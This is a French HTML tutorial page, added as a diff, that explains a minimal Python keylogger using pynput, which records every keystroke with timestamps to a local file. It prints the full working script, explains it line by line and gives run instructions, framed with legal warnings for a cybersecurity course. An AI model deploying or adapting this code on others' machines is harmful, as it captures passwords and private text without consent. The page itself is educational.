@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Explication du Keylogger en Python</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+        }
+        pre {
+            background-color: #f4f4f4;
+            padding: 15px;
+            border-left: 3px solid #ccc;
+            overflow-x: auto;
+        }
+        code {
+            font-family: "Courier New", Courier, monospace;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        p {
+            line-height: 1.6;
+        }
+        .warning {
+            color: red;
+            font-weight: bold;
+        }
+        .section {
+            margin-bottom: 30px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Projet de Keylogger en Python</h1>
+
+<p class="warning">⚠️ <strong>Avertissement :</strong> L'utilisation de keyloggers est soumise à des lois strictes concernant la vie privée et la surveillance. Ce code doit être utilisé uniquement à des fins éducatives dans un environnement contrôlé avec le consentement explicite de toutes les parties concernées.</p>
+
+<div class="section">
+    <h2>Le Code :</h2>
+    <pre><code>from pynput import keyboard
+import logging
+
+# Configuration du logging pour enregistrer les frappes dans un fichier
+logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')
+
+# Fonction appelée à chaque pression de touche
+def on_press(key):
+    logging.info(str(key))
+
+# Mise en place du listener pour capturer les frappes de clavier
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()
+</code></pre>
+</div>
+
+<div class="section">
+    <h2>Explication du Code :</h2>
+    <h3>Importation des Modules :</h3>
+    <pre><code>from pynput import keyboard
+import logging</code></pre>
+    <p>Le script importe deux modules essentiels :</p>
+    <ul>
+        <li><code>pynput.keyboard</code> : Pour surveiller et capturer les frappes du clavier.</li>
+        <li><code>logging</code> : Pour enregistrer les données capturées dans un fichier.</li>
+    </ul>
+
+    <h3>Configuration du Logging :</h3>
+    <pre><code>logging.basicConfig(filename='keylog.txt', level=logging.DEBUG, format='%(asctime)s - %(message)s')</code></pre>
+    <p>Cette ligne configure le module <code>logging</code> pour enregistrer les frappes de touches dans un fichier nommé <code>keylog.txt</code>. Le niveau de logging est défini à <code>DEBUG</code> pour capturer tous les événements, et le format inclut un horodatage.</p>
+
+    <h3>Définition de la Fonction <code>on_press</code> :</h3>
+    <pre><code>def on_press(key):
+    logging.info(str(key))</code></pre>
+    <p>La fonction <code>on_press</code> est appelée chaque fois qu'une touche est pressée. Elle convertit la touche en chaîne de caractères et l'enregistre dans le fichier log.</p>
+
+    <h3>Mise en Place du Listener :</h3>
+    <pre><code>with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()</code></pre>
+    <p>Ce bloc de code crée un listener qui surveille les frappes du clavier en utilisant la fonction <code>on_press</code> définie précédemment. La méthode <code>listener.join()</code> permet au programme de continuer à écouter indéfiniment jusqu'à ce qu'il soit arrêté manuellement.</p>
+</div>
+
+<div class="section">
+    <h2>Comment Utiliser ce Script :</h2>
+    <ol>
+        <li>Assurez-vous que Python est installé sur votre système.</li>
+        <li>Installez le module <code>pynput</code> en exécutant la commande :
+            <pre><code>pip install pynput</code></pre>
+        </li>
+        <li>Copiez le code dans un fichier avec l'extension <code>.py</code>, par exemple <code>keylogger.py</code>.</li>
+        <li>Exécutez le script dans un terminal ou une invite de commandes :
+            <pre><code>python keylogger.py</code></pre>
+        </li>
+        <li>Le script s'exécutera en arrière-plan et enregistrera toutes les frappes de touches dans le fichier <code>keylog.txt</code>.</li>
+        <li>Pour arrêter le script, vous pouvez fermer le terminal ou arrêter le processus Python.</li>
+    </ol>
+</div>
+
+<div class="section">
+    <h2>Considérations Légales et Éthiques :</h2>
+    <p>L'utilisation d'un keylogger pour enregistrer les frappes de clavier d'un utilisateur sans son consentement explicite est illégale et contraire à l'éthique. Voici quelques points importants à considérer :</p>
+    <ul>
+        <li>Utilisez ce script uniquement à des fins éducatives et dans un environnement contrôlé.</li>
+        <li>Obtenez toujours le consentement explicite de toutes les personnes dont les frappes pourraient être enregistrées.</li>
+        <li>Respectez les lois et réglementations locales et nationales concernant la surveillance et la protection de la vie privée.</li>
+        <li>Ne partagez pas ni n'utilisez les données collectées à des fins malveillantes.</li>
+    </ul>
+</div>
+
+<div class="section">
+    <h2>Explication Approfondie du Fonctionnement :</h2>
+    <h3>1. Importation des Modules :</h3>
+    <p>Le script commence par importer les modules nécessaires :</p>
+    <ul>
+        <li><code>pynput.keyboard</code> : Permet d'écouter les événements du clavier.</li>
+        <li><code>logging</code> : Fournit un moyen flexible d'enregistrer les événements et les messages du programme.</li>
+    </ul>
+
+    <h3>2. Configuration du Logging :</h3>
+    <p>La configuration du logging spécifie :</p>
+    <ul>
+        <li><code>filename='keylog.txt'</code> : Le nom du fichier où les frappes seront enregistrées.</li>
+        <li><code>level=logging.DEBUG</code> : Le niveau de gravité des messages à enregistrer. <code>DEBUG</code> est le niveau le plus bas, enregistrant tous les messages.</li>
+        <li><code>format='%(asctime)s - %(message)s'</code> : Le format des messages enregistrés, incluant l'horodatage.</li>
+    </ul>
+
+    <h3>3. Fonction <code>on_press</code> :</h3>
+    <p>Cette fonction est appelée chaque fois qu'une touche est pressée :</p>
+    <pre><code>def on_press(key):
+    logging.info(str(key))</code></pre>
+    <ul>
+        <li><code>key</code> : L'objet représentant la touche pressée.</li>
+        <li><code>logging.info(str(key))</code> : Convertit la touche en chaîne de caractères et l'enregistre dans le fichier log.</li>
+    </ul>
+
+    <h3>4. Mise en Place du Listener :</h3>
+    <p>Le listener est mis en place pour surveiller les événements du clavier :</p>
+    <pre><code>with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()</code></pre>
+    <ul>
+        <li><code>keyboard.Listener</code> : Crée un nouvel écouteur pour les événements du clavier.</li>
+        <li><code>on_press=on_press</code> : Spécifie la fonction à appeler lorsqu'une touche est pressée.</li>
+        <li><code>listener.join()</code> : Démarre le listener et le maintient actif.</li>
+    </ul>
+</div>
+
+<div class="section">
+    <h2>Points à Noter :</h2>
+    <ul>
+        <li>Ce script enregistrera toutes les frappes, y compris les touches spéciales (Entrée, Échap, etc.), qui seront enregistrées sous leur représentation Python (par exemple, <code>'Key.enter'</code>).</li>
+        <li>Les frappes sont enregistrées avec un horodatage, ce qui peut être utile pour l'analyse temporelle.</li>
+        <li>Le fichier <code>keylog.txt</code> sera créé dans le même répertoire que le script Python. Assurez-vous d'avoir les permissions d'écriture nécessaires.</li>
+    </ul>
+</div>
+
+<div class="section">
+    <h2>Conclusion :</h2>
+    <p>Ce keylogger simple en Python illustre comment intercepter les frappes de clavier en utilisant le module <code>pynput</code>. Il est important de rappeler que ce type d'outil doit être utilisé de manière responsable et éthique. Dans le cadre de votre cours de cybersécurité, ce script peut servir à démontrer les risques liés aux enregistreurs de frappe et l'importance de la sécurité informatique.</p>
+</div>
+
+</body>
+</html>
